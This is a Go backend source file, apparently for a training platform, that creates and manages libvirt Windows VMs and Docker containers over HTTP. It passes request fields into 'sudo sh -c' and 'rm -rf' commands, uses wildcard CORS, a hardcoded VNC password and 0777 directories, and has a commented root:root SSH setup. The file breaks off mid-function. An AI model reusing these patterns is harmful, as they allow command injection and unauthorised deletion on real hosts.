package makevm

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/backend/caldera"
	"github.com/backend/database"
	"github.com/backend/utils"
	"github.com/docker/docker/api/types"
	"github.com/docker/docker/api/types/container"
	"github.com/docker/docker/client"
	"github.com/docker/docker/pkg/stdcopy"
	"github.com/docker/go-connections/nat"
	"github.com/huandu/xstrings"
	"github.com/libvirt/libvirt-go"
	"golang.org/x/crypto/ssh"
)

func RemoveStar(temp string) string {
	re := regexp.MustCompile(`[\{\}\[\]\/?.,;:|\)*~!^\-_+<>@\#$%&\\\=\(\'\"\n\r]+`)
	key := re.ReplaceAllString(temp, "")

	return key
}

func RemoveStar_IPver(temp string) string {
	re := regexp.MustCompile(`[\{\}\[\]\/?,;:|\)*~!^\-_+<>@\#$%&\\\=\(\'\"\n\r]+`)
	key := re.ReplaceAllString(temp, "")

	return key
}

func findExt(fileName string) string {
	var copyExtensions string
	flag := 1
	for index := len(fileName) - 1; index >= 0; index-- {
		if fileName[index] == '.' {
			flag = 0
			break
		}
		copyExtensions += string(fileName[index])
	}
	if flag == 1 { //확장자 없는 경우 에러 처리
		return ""
	}
	copyExtensions = xstrings.Reverse(copyExtensions)

	return copyExtensions
}

type Getwinlist struct {
	winname []string
}

func GetWindowslist(w http.ResponseWriter, r *http.Request) {
	conn, err := libvirt.NewConnect("qemu:///system")
	if err != nil {
		println(err)
		return
	}
	defer conn.Close()

	doms, err := conn.ListAllDomains(libvirt.CONNECT_LIST_DOMAINS_ACTIVE)
	if err != nil {
		println(err)
		return
	}

	var retwinlist Getwinlist
	var temp []string
	for _, dom := range doms {
		name, err := dom.GetName()
		if err != nil {
			println(err)
			return
		}
		temp = append(temp, name)
		dom.Free()
	}
	retwinlist.winname = temp
	json.NewEncoder(w).Encode(retwinlist.winname)
}

type Getlinlist struct {
	linname []string
}

func GetLinuxlist(w http.ResponseWriter, r *http.Request) {
	dockerimagelist_rtn := Dockerimageps()
	var returnlinuxlist Getlinlist
	var temp []string

	for i := 0; i < len(dockerimagelist_rtn.Data); i++ {
		temp = append(temp, dockerimagelist_rtn.Data[i].REPOSITORY)
	}

	returnlinuxlist.linname = temp
	json.NewEncoder(w).Encode(returnlinuxlist.linname)
}

type accesswindowuser struct {
	VMname   string
	Username string
	System   string
}

type returnwindowuser struct {
	Vmport string
}

func AccessWindows(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()
	var vncwindows accesswindowuser
	json.NewDecoder(r.Body).Decode(&vncwindows)

	TempateDir := "/home/ar/user_windows/template/"
	Originqcow2 := TempateDir + vncwindows.VMname + ".qcow2"
	NewUserDir := "/home/ar/user_windows/user/" + vncwindows.Username
	os.MkdirAll(NewUserDir, 0777)
	Newqcow2_user := NewUserDir + "/" + vncwindows.Username + ".qcow2"
	ExcuteCMD("sudo", "rm", "-rf", Newqcow2_user)
	ExcuteCMD("sudo", "sh", "-c", "\\cp "+Originqcow2+" "+Newqcow2_user)

	//실행
	ExcuteCMD("virt-install", "--name="+vncwindows.Username, "--ram=4096", "--cpu=host", "--vcpus=1", "--os-type=windows", "--os-variant=win10", "--disk", "path="+Newqcow2_user+",device=disk,bus=virtio,format=qcow2", "--network", "network=default,model=virtio", "--graphics", "vnc,password=pdxf,listen=0.0.0.0", "--import", "--wait", "0", "--check", "all=off")
	cmd := exec.Command("virsh", "vncdisplay", vncwindows.Username)
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println(string(output))
		fmt.Println((err))
	}
	tempvncport := string(output)
	r2, _ := regexp.Compile("[0-9]")
	vncport := r2.FindString(tempvncport)
	returnvncport, err := strconv.Atoi(vncport)
	if err != nil {
		fmt.Println((err))
	}
	tempvirshport := returnvncport
	Realport := 5900 + tempvirshport
	forwardport := Realport + 180
	R_Realport := strconv.Itoa(Realport)
	R_forwardport := strconv.Itoa(forwardport)
	var returndata returnwindowuser
	returndata.Vmport = R_Realport
	json.NewEncoder(w).Encode(returndata)

	go ExcuteCMD("sudo", "sh", "/usr/share/novnc/utils/launch.sh", "--vnc", "localhost:"+R_Realport, "--ssl-only", "--listen", R_forwardport)

	w.WriteHeader(http.StatusOK)
}

type accesslinuxuser struct {
	Image_ID   string
	System     string
	Username   string
	ScenarioId int
}

func AccessLinux(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()
	var tempdata accesslinuxuser
	json.NewDecoder(r.Body).Decode(&tempdata)
	go ExcuteCMD("gotty", "--once", "-w", "docker", "run", "--name", tempdata.Username, "-it", "--rm", tempdata.Image_ID, "/bin/bash")
	// json.NewEncoder(w).Encode()\
	w.WriteHeader(http.StatusOK)
}
func GetQemuIP(Domain string) string {
	MacAddress_temp := RtExcuteCMD("virsh", "dumpxml", Domain)
	r, _ := regexp.Compile("([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}")
	MacAddress := r.FindString(MacAddress_temp)
	// fmt.Println(MacAddress)
	IP_temp := RtExcuteCMD("sh", "-c", "arp -an | grep "+MacAddress)
	r1, _ := regexp.Compile("(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}")
	IP_Real := r1.FindString(IP_temp)
	// fmt.Println(IP_Real)
	return IP_Real
}

func UploadsHandler(w http.ResponseWriter, r *http.Request) {
	uploadFile, header, err := r.FormFile("upload_file") // id가 upload_file이다.
	if err != nil {                                      // 에러 제어
		w.WriteHeader(http.StatusBadRequest)
		fmt.Fprint(w, err)
		return
	}
	defer uploadFile.Close()

	if findExt(header.Filename) == "iso" { //windows .iso파일 업로드
		dirname := "./makevm/uploads/Windows"
		os.MkdirAll(dirname, 0777)                                 // dirname 폴더가 없으면 만들어줌, 777 -> read,write,execute 가능
		filepath := fmt.Sprintf("%s/%s", dirname, header.Filename) // 폴더명/파일명, 파일명은 header에 들어있다.
		file, err := os.Create(filepath)                           // 비어있는 새로운 파일을 만듬

		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			fmt.Fprint(w, err)
			return
		}
		io.Copy(file, uploadFile)
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, filepath)
		defer file.Close()

	} else if findExt(header.Filename) == "tar" {
		dirname := "./makevm/uploads/Linux"
		os.MkdirAll(dirname, 0777)
		filepath := fmt.Sprintf("%s/%s", dirname, header.Filename)
		file, err := os.Create(filepath)

		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			fmt.Fprint(w, err)
			return
		}
		io.Copy(file, uploadFile)
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, filepath)
		defer file.Close()
	} else {
		fmt.Fprint(w, "확장자를 확인해주세요")
		return
	}
}

// iso list
type FileNamelist struct {
	Num      int    `json:"num"`
	FileName string `json:"title"`
}

func Makevmfile(w http.ResponseWriter, r *http.Request) {
	targetDir := "./makevm/uploads/Windows/"
	files, err := ioutil.ReadDir(targetDir)
	if err != nil {
		panic(err)
	}

	// var list_ret FileNamelist
	var list_retn []FileNamelist

	for i, file := range files {
		// 파일명
		//fmt.Println(file.Name())
		var list_ret FileNamelist
		list_ret.Num = i + 1
		list_ret.FileName = file.Name()
		list_retn = append(list_retn, list_ret)
		//   // 파일의 절대경로
		//   fmt.Println(fmt.Sprintf("%v/%v", targetDir, file.Name()))
	}
	data := struct {
		Data []FileNamelist `json:"data"`
	}{list_retn}
	json.NewEncoder(w).Encode(data)
	// fmt.Println(data)
	// w.WriteHeader(http.StatusOK)
	// fmt.Println("complete vm list")
}

// isExistFile
func isExistFile(fname string) bool {
	if _, err := os.Stat(fname); os.IsNotExist(err) {
		return false
	}
	return true
}

func fileNameWithoutExtension(fileName string) string {
	if pos := strings.LastIndexByte(fileName, '.'); pos != -1 {
		return fileName[:pos]
	}
	return fileName
}

func ExcuteCMD(script string, arg ...string) {
	cmd := exec.Command(script, arg...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println(string(output))
		fmt.Println((err))
	} else {
		fmt.Println(string(output))
	}
}

func RtExcuteCMD(script string, arg ...string) string {
	cmd := exec.Command(script, arg...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		// fmt.Println(string(output))
		fmt.Println("hi")
	}
	return string(output)
}

// makevm list
type Isoname struct {
	ISO_name string
}

// iso to vm(qcow2)
func Isotoqcow2(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()
	var isoname Isoname
	// enc := json.NewEncoder(w)
	json.NewDecoder(r.Body).Decode(&isoname)

	TemplateDIR := "/home/ar/user_windows/template/"
	// OriginalDIR := "/home/ar/user_windows/user"
	UploadDIR := "./makevm/uploads/Windows/"
	NewVM := TemplateDIR + fileNameWithoutExtension(isoname.ISO_name) + ".qcow2"

	if !isExistFile(TemplateDIR + "virtio-win-0.1.171.iso") {
		ExcuteCMD("wget", "https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/archive-virtio/virtio-win-0.1.171-1/virtio-win-0.1.171.iso", "-P", TemplateDIR)
	}

	// fmt.Println(NewVM)
	// Comp_NewVM:=OriginalDIR+fileNameWithoutExtension(isoname.ISO_name)+"_comp.qcow2"

	//빈 qcow2 파일 생성
	// fmt.Println("1번")
	ExcuteCMD("qemu-img", "create", "-f", "qcow2", NewVM, "30G")

	// iso -> qcow2 생성
	// fmt.Println("2번")
	ExcuteCMD("virt-install", "--name="+fileNameWithoutExtension(isoname.ISO_name), "--ram=4096", "--cpu=host", "--vcpus=1", "--os-type=windows", "--os-variant=win10", "--disk", "path="+NewVM+",format=qcow2,bus=virtio", "--disk", UploadDIR+isoname.ISO_name+",device=cdrom", "--disk", TemplateDIR+"virtio-win-0.1.171.iso,device=cdrom", "--network", "network=default,model=virtio", "--graphics", "vnc,password=pdxf,listen=0.0.0.0", "--import", "--wait", "0", "--check", "all=off", "--cdrom="+UploadDIR+isoname.ISO_name)

}

// makevm eidit list
type EditISOname struct {
	Windows_ISO_NewName string
	ISO_name            string
}

func EditISO(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()
	var isoeditname EditISOname
	json.NewDecoder(r.Body).Decode(&isoeditname)
	UploadDIR := "./makevm/uploads/Windows/"
	NEW_ISO_Routes := UploadDIR + isoeditname.Windows_ISO_NewName
	ISO_route := UploadDIR + isoeditname.ISO_name
	ExcuteCMD("mv", "-f", ISO_route, NEW_ISO_Routes)
}

func DelISO(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()
	var isoname Isoname
	json.NewDecoder(r.Body).Decode(&isoname)
	UploadDIR := "./makevm/uploads/Windows/"
	ISO_route := UploadDIR + isoname.ISO_name
	ExcuteCMD("rm", "-rf", ISO_route)
}

// virsh list
type Vrishlist struct {
	ID     uint
	Domain string
	State  string
	Port   int
}

func GetStatemsg(msg int) string {
	retdata := ""
	switch msg {
	case 0:
		retdata = "NOSTATE"
	case 1:
		retdata = "RUNNING"
	case 2:
		retdata = "BLOCKED"
	case 3:
		retdata = "PAUSED"
	case 4:
		retdata = "SHUTDOWN"
	case 5:
		retdata = "SHUTOFF"
	case 6:
		retdata = "CRASHED"
	case 7:
		retdata = "PMSUSPENDED"
	default:
		retdata = "NOSTATE"
	}
	return retdata
}

func Listwinvm(w http.ResponseWriter, r *http.Request) { //Windows list --all

	conn, err := libvirt.NewConnect("qemu:///system")
	if err != nil {
		println(err)
		return
	}
	defer conn.Close()

	doms, err := conn.ListAllDomains(libvirt.CONNECT_LIST_DOMAINS_ACTIVE)
	if err != nil {
		println(err)
		return
	}

	var retrunvirshlist []Vrishlist
	for _, dom := range doms {
		var tempvirshlist Vrishlist
		name, err := dom.GetName()
		if err != nil {
			println(err)
			return
		}
		dominfo, err := dom.GetInfo()
		if err != nil {
			println(err)
			return
		}
		domid, err := dom.GetID()
		if err != nil {
			println(err)
			return
		}

		tempvirshlist.Domain = name
		tempvirshlist.ID = domid
		tempvirshlist.State = GetStatemsg(int(dominfo.State))

		cmd := exec.Command("virsh", "vncdisplay", name)
		output, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Println(string(output))
			fmt.Println((err))
		}
		tempvncport := string(output)
		r, _ := regexp.Compile("[0-9]")
		vncport := r.FindString(tempvncport)
		returnvncport, err := strconv.Atoi(vncport)
		if err != nil {
			fmt.Println((err))
		}
		tempvirshlist.Port = returnvncport
		// fmt.Println(name)
		// fmt.Println(domid)
		// fmt.Println(GetStatemsg(int(dominfo.State)))
		retrunvirshlist = append(retrunvirshlist, tempvirshlist)
		dom.Free()
	}

	doms_in, err := conn.ListAllDomains(libvirt.CONNECT_LIST_DOMAINS_INACTIVE)
	if err != nil {
		println(err)
		return
	}

	for _, dom := range doms_in {
		var tempvirshlist Vrishlist
		name, err := dom.GetName()
		if err != nil {
			println(err)
			return
		}
		dominfo, err := dom.GetInfo()
		if err != nil {
			println(err)
			return
		}
		tempvirshlist.Domain = name
		tempvirshlist.State = GetStatemsg(int(dominfo.State))
		tempvirshlist.Port = 4444
		// fmt.Println(name)
		// fmt.Println(GetStatemsg(int(dominfo.State)))
		retrunvirshlist = append(retrunvirshlist, tempvirshlist)
		// fmt.Println(retrunvirshlist)
		dom.Free()
	}

	sort.Slice(retrunvirshlist, func(i, j int) bool {
		return retrunvirshlist[i].Port < retrunvirshlist[j].Port
	})

	for i := 0; i < len(retrunvirshlist); i++ {
		if retrunvirshlist[i].Port == 4444 {
			retrunvirshlist[i].Port = 0
			continue
		}
		retrunvirshlist[i].Port = retrunvirshlist[i].Port + 5900
	}

	data := struct {
		Data []Vrishlist `json:"data"`
	}{retrunvirshlist}
	json.NewEncoder(w).Encode(data)
	// fmt.Println(data)
	// w.WriteHeader(http.StatusOK) // err없이 잘 되면 OK신호
}

func Qcowlist(w http.ResponseWriter, r *http.Request) {
	targetDir := "/home/ar/user_windows/template"
	files, err := ioutil.ReadDir(targetDir)
	if err != nil {
		panic(err)
	}

	// var list_ret FileNamelist
	var list_retn []FileNamelist

	for i, file := range files {
		// 파일명
		//fmt.Println(file.Name())
		if findExt(file.Name()) == "qcow2" {
			var list_ret FileNamelist
			list_ret.Num = i + 1
			list_ret.FileName = file.Name()
			list_retn = append(list_retn, list_ret)
			//   // 파일의 절대경로
			//   fmt.Println(fmt.Sprintf("%v/%v", targetDir, file.Name()))
		}
	}
	data := struct {
		Data []FileNamelist `json:"data"`
	}{list_retn}
	json.NewEncoder(w).Encode(data)
	// fmt.Println(data)
	// w.WriteHeader(http.StatusOK) // err없이 잘 되면 OK신호
	// fmt.Println("complete qcow2 list")
}

type Qcow2file struct {
	Newfilename    string
	Originfilename string
}

func Editqcow2(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()
	var qcowname Qcow2file
	json.NewDecoder(r.Body).Decode(&qcowname)
	TemplateDIR := "/home/ar/user_windows/template/"
	NEW_qcow2name := TemplateDIR + qcowname.Newfilename
	Origin_qcow2name := TemplateDIR + qcowname.Originfilename
	ExcuteCMD("mv", "-f", Origin_qcow2name, NEW_qcow2name)
}

type Qcow2file2 struct {
	Filename string
}

func Delqcow2(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()
	var qcowname Qcow2file2
	json.NewDecoder(r.Body).Decode(&qcowname)
	TemplateDIR := "/home/ar/user_windows/template/"
	Qcow2_route := TemplateDIR + qcowname.Filename
	ExcuteCMD("rm", "-rf", Qcow2_route)
}

type Qcow2startstruct struct {
	Filename string
}

func RunningEffect(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()
	var runningvm Qcow2startstruct
	json.NewDecoder(r.Body).Decode(&runningvm)
	// json.NewEncoder(w).Encode(runningvm)
	// fmt.Println(runningvm)
}

func Startqcow2(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()
	var filename Qcow2startstruct
	json.NewDecoder(r.Body).Decode(&filename)
	TemplateDIR := "/home/ar/user_windows/template/"
	NewDIR := TemplateDIR + filename.Filename
	ExcuteCMD("virt-install", "--name="+fileNameWithoutExtension(filename.Filename), "--ram=4096", "--cpu=host", "--vcpus=1", "--os-type=windows", "--os-variant=win10", "--disk", "path="+NewDIR+",device=disk,bus=virtio,format=qcow2", "--network", "network=default,model=virtio", "--graphics", "vnc,password=pdxf,listen=0.0.0.0", "--import", "--wait", "0", "--check", "all=off")
	json.NewDecoder(r.Body).Decode(&filename)
	json.NewEncoder(w).Encode(filename)
	// fmt.Println(filename)
}

type VNCWindows struct {
	VMname   string
	VNC_port string
}

func AccessVNCWindows(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()
	var vncwindows VNCWindows
	json.NewDecoder(r.Body).Decode(&vncwindows)
	tempnum1, err := strconv.Atoi(vncwindows.VNC_port)
	if err != nil {
		fmt.Println("Atoi Err")
	}
	tempnum2 := tempnum1 + 180
	restrnum := strconv.Itoa(tempnum2)
	ExcuteCMD("sudo", "sh", "/usr/share/novnc/utils/launch.sh", "--vnc", "localhost:"+vncwindows.VNC_port, "--ssl-only", "--listen", restrnum)
	json.NewEncoder(w).Encode(restrnum)
	// w.WriteHeader(http.StatusOK) // err없이 잘 되면 OK신호
}

type Qcow2clonestruct struct {
	Filename      string
	Clonefilename string
}

func Cloneqcow2(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()
	var filename Qcow2clonestruct
	json.NewDecoder(r.Body).Decode(&filename)

	TemplateDIR := "/home/ar/user_windows/template/"
	OriginDIR := TemplateDIR + filename.Filename
	CloneDIR := TemplateDIR + filename.Clonefilename
	ExcuteCMD("cp", "-rf", OriginDIR, CloneDIR)
}

// makedocker
type Docker_ struct {
	Docker_name string
}

func Makedocker(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()
	var do_name Docker_
	json.NewDecoder(r.Body).Decode(&do_name)
	// fmt.Println(do_name.Docker_name)
	ExcuteCMD("docker", "pull", do_name.Docker_name)
	// fmt.Println("도커 성공적")
}

func AccessTerminalDocker(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()
	var tempdata DockerTemp
	json.NewDecoder(r.Body).Decode(&tempdata)
	ExcuteCMD("gotty", "--once", "-w", "docker", "run", "-it", "--rm", tempdata.Image_ID, "/bin/bash")
}

// 커스텀성현

type DockerResponse struct {
	Ssh  string `json:"ssh"`
	Http string `json:"http"`
}

func dockerun(port1, port2, linux_name string) int {
	ctx := context.Background()
	cli, err := client.NewClientWithOpts(client.FromEnv, client.WithAPIVersionNegotiation())
	if err != nil {
		panic(err)
	}
	// fmt.Println("thisis" + linux_name)
	resp, err := cli.ContainerCreate(ctx, &container.Config{
		Image: linux_name,
		//apt update; apt install net-tools openssh-server vim -y; mkdir /var/run/sshd; echo 'root:root' |chpasswd; sed -ri 's/^#?PermitRootLogin\s+.*/PermitRootLogin yes/' /etc/ssh/sshd_config; sed -ri 's/UsePAM yes/#UsePAM yes/g' /etc/ssh/sshd_config; mkdir /root/.ssh; service ssh start; sleep infinity
		//Cmd: []string{"apt", "update;", "apt", "install", "net-tools", "openssh-server", "vim", "-y;", "mkdir", "/var/run/sshd;", "echo", "'root:root'", "|chpasswd;", "sed", "-ri", "'s/^#?PermitRootLogin\\s+.*/PermitRootLogin", "yes/'", "/etc/ssh/sshd_config;", "sed", "-ri", "'s/UsePAM", "yes/#UsePAM", "yes/g'", "/etc/ssh/sshd_config;", "mkdir", "/root/.ssh;", "service", "ssh", "start;", "sleep", "infinity"},
		// Cmd: []string{"sleep", "infinity"},
		Tty: false,
		ExposedPorts: nat.PortSet{
			nat.Port("22/tcp"): {},
			nat.Port("80/tcp"): {},
		},
	}, &container.HostConfig{
		PortBindings: nat.PortMap{
			"22/tcp": []nat.PortBinding{
				{
					HostIP:   "0.0.0.0",
					HostPort: port1,
				},
			},
			"80/tcp": []nat.PortBinding{
				{
					HostIP:   "0.0.0.0",
					HostPort: port2,
				},
			},
		},
	}, nil, nil, "")
	if err != nil {
		panic(err)
	}

	if err := cli.ContainerStart(ctx, resp.ID, types.ContainerStartOptions{}); err != nil {
		panic(err)
	}
	/*
		statusCh, errCh := cli.ContainerWait(ctx, resp.ID, container.WaitConditionNotRunning)
		select {
		case err := <-errCh:
			if err != nil {
				panic(err)
			}
		case <-statusCh:
		}
	*/
	out, err := cli.ContainerLogs(ctx, resp.ID, types.ContainerLogsOptions{ShowStdout: true})
	if err != nil {
		panic(err)
	}

	stdcopy.StdCopy(os.Stdout, os.Stderr, out)
	return 1
}

func DockerRun(linux_name string) DockerResponse {
	var portstr1, portstr2 string = RandPort()
	// fmt.Println(portstr1)
	// fmt.Println(portstr2)
	if dockerun(portstr1, portstr2, linux_name) == 1 {
		resp := DockerResponse{portstr1, portstr2}
		return resp
	}
	return DockerResponse{"0", "0"}
}

func RandRange(min, max int) int {
	rand.Seed(time.Now().Unix())
	randNum := rand.Intn(max - min)
	randNum = randNum + min
	return randNum
}

func RandPort() (string, string) {
	for {
		var port1 int = RandRange(1024, 65534)
		var port2 int = port1 + 1

		var s1 bytes.Buffer
		s1.WriteString("netstat -antul | grep ':")
		s1.WriteString(strconv.Itoa(port1))
		s1.WriteString("'")

		var s2 bytes.Buffer
		s2.WriteString("netstat -antul | grep ':")
		s2.WriteString(strconv.Itoa(port2))
		s2.WriteString("'")

		cmd1 := exec.Command("sh", "-c", s1.String())
		_, err1 := cmd1.Output()

		cmd2 := exec.Command("sh", "-c", s2.String())
		_, err2 := cmd2.Output()

		if err1 != nil {
			if err2 != nil {
				return strconv.Itoa(port1), strconv.Itoa(port2)
			}
		}
	}
}

// Docker list
type Docker_list struct {
	ContainerID string       `json:"ContainerID"`
	IMAGE       string       `json:"IMAGE"`
	STATUS      string       `json:"STATUS"`
	PORTS       []types.Port `json:"PORTS"`
}
type data struct {
	Data []Docker_list `json:"data"`
}

func Dockerlist(w http.ResponseWriter, r *http.Request) {

	// var list_ret FileNamelist
	// var dockerlist_rtn []Docker_list
	dockerlist_rtn := Dockerps()
	json.NewEncoder(w).Encode(dockerlist_rtn)
	// fmt.Println(dockerlist_rtn)
	// w.WriteHeader(http.StatusOK) // err없이 잘 되면 OK신호
	// fmt.Println("docker list complete")
}

func Dockerps() data {

	var dockerlist_retn []Docker_list
	ctx := context.Background()
	cli, err := client.NewClientWithOpts(client.FromEnv, client.WithAPIVersionNegotiation())
	if err != nil {
		panic(err)
	}
	defer cli.Close()

	containers, err := cli.ContainerList(ctx, types.ContainerListOptions{})
	if err != nil {
		panic(err)
	}

	for _, container := range containers {
		var dockerlist_rtn Docker_list
		// fmt.Println(container.ID)
		// fmt.Println(container.Image)
		// fmt.Println(container.Status)
		// fmt.Println(container.Ports)
		dockerlist_rtn.ContainerID = container.ID
		dockerlist_rtn.ContainerID = dockerlist_rtn.ContainerID[:15]
		dockerlist_rtn.IMAGE = container.Image
		dockerlist_rtn.STATUS = container.Status
		dockerlist_rtn.PORTS = container.Ports
		dockerlist_retn = append(dockerlist_retn, dockerlist_rtn)
	}
	data := struct {
		Data []Docker_list `json:"data"`
	}{dockerlist_retn}

	// fmt.Println(data)
	return data
}

// dockerlist
type Dockerlistresp struct {
	Docker_image       string
	Docker_containerID string
}

func DockerDestroy(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()
	var _name Dockerlistresp
	json.NewDecoder(r.Body).Decode(&_name)
	// fmt.Println(_name.Docker_containerID)
	ExcuteCMD("docker", "rm", "-f", _name.Docker_containerID)
}

func Dockerimagelist(w http.ResponseWriter, r *http.Request) {
	dockerimagelist_rtn := Dockerimageps()
	// fmt.Println(dockerimagelist_rtn)
	json.NewEncoder(w).Encode(dockerimagelist_rtn)
	// fmt.Println(dockerimagelist_rtn)
	// w.WriteHeader(http.StatusOK) // err없이 잘 되면 OK신호
	// fmt.Println("docker image list complete")
}

// Docker image list
type Docker_image_list struct {
	REPOSITORY string `json:"REPOSITORY"`
	IMAGE_ID   string `json:"IMAGE_ID"`
	CREATED    int    `json:"CREATED"`
}

type data1 struct {
	Data []Docker_image_list `json:"data"`
}

func Dockerimageps() data1 {
	var dockerimagelist_retn []Docker_image_list
	ctx := context.Background()
	cli, err := client.NewClientWithOpts(client.FromEnv, client.WithAPIVersionNegotiation())
	if err != nil {
		panic(err)
	}
	defer cli.Close()

	images, err := cli.ImageList(ctx, types.ImageListOptions{})
	if err != nil {
		panic(err)
	}

	for _, image := range images {
		var dockerimagelist_rtn Docker_image_list
		// fmt.Println(image.RepoTags)
		// fmt.Println(image.ID)
		// fmt.Println(image.Created)
		// fmt.Println(reflect.TypeOf(image.RepoTags))
		if image.RepoTags != nil {
			for _, temp := range image.RepoTags {
				dockerimagelist_rtn.REPOSITORY = temp
				dockerimagelist_rtn.IMAGE_ID = image.ID[7:21]
				dockerimagelist_rtn.CREATED = int(image.Created)
				dockerimagelist_retn = append(dockerimagelist_retn, dockerimagelist_rtn)
			}
		}
	}

	data := struct {
		Data []Docker_image_list `json:"data"`
	}{dockerimagelist_retn}

	// fmt.Println(data)
	return data
}

// Win vm del
type WinVM struct {
	WinVMDomain string
}

func Delwinvm(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()
	var winvmdata WinVM
	json.NewDecoder(r.Body).Decode(&winvmdata)
	// fmt.Println(winvmdata)
	ExcuteCMD("virsh", "destroy", winvmdata.WinVMDomain)
	ExcuteCMD("virsh", "undefine", winvmdata.WinVMDomain)
	//ExcuteCMD("rm", "-rf", "/home/ar/user_windows/template/"+winvmdata.WinVMDomain+".qcow2")
}

func Suspendwinvm(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()
	var winvmdata WinVM
	json.NewDecoder(r.Body).Decode(&winvmdata)
	// fmt.Println(winvmdata)
	ExcuteCMD("virsh", "suspend", winvmdata.WinVMDomain)
}

func Startwinvm(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()
	var winvmdata WinVM
	json.NewDecoder(r.Body).Decode(&winvmdata)
	// fmt.Println(winvmdata)
	ExcuteCMD("virsh", "start", winvmdata.WinVMDomain)
}

func Resumewinvm(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()
	var winvmdata WinVM
	json.NewDecoder(r.Body).Decode(&winvmdata)
	// fmt.Println(winvmdata)
	ExcuteCMD("virsh", "resume", winvmdata.WinVMDomain)
}

func MakeDockerImage(w http.ResponseWriter, r *http.Request) { //도커 컨테이너 -> 이미지
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()
	var _name Dockerlistresp
	json.NewDecoder(r.Body).Decode(&_name)
	// fmt.Println(_name)
	ExcuteCMD("docker", "commit", _name.Docker_containerID, _name.Docker_image)
	// fmt.Println("도커 이미지 생성 완료")
}

type DockerTemp struct {
	Image_ID       string
	Container_Name string
}

func DestoryDockerImage(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Headers", "Content-Type")
	r.ParseForm()

	var temp DockerTemp
	json.NewDecoder(r.Body).Decode(&temp)
	// makestring := strings.Index(temp.Container_Name, ":")
	// temp.Container_Name = temp.Container_Name[:makestring]

	// code_temp := "$(docker ps -aq --filter ancestor=" + temp.Container_Name + ")"
	// fmt.Println(code_temp)
	// ExcuteCMD("docker", "rm", "-f", code_temp)
	cmd := exec.Command("docker", "ps", "-aq", "--filter", "ancestor="+temp.Image_ID)
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println(string(output))
		fmt.Println((err))
	} else {
		fmt.Println(string(output))
	}

	if len(string(output)) == 0 {
		// fmt.Println("이게 없네;;")
		ExcuteCMD("docker", "rmi", "-f", temp.Image_ID)
	} else if string(output)[len(string(output))-1] == '\n' {

		tmp_string := strings.Split(string(output), "\n")
